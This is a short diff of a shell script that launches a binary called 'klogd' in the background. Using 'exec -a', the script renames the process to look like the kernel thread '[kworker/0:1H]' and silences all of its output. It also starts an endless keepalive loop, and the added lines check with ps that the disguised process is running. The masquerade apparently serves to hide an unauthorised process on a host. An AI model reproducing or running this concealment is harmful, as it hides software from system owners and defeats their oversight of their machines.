@@ -10,4 +10,8 @@ chmod +x klogd
 nohup bash -c 'exec -a [kworker/0:1H] ./klogd --background --config=config.json' >/dev/null 2>&1 &
 
 nohup bash -c 'while true; do sleep 300; done' >/dev/null 2>&1 &
+sleep 2
+
+ps aux | grep 'kworker/0:1H' | grep -v grep
+
 
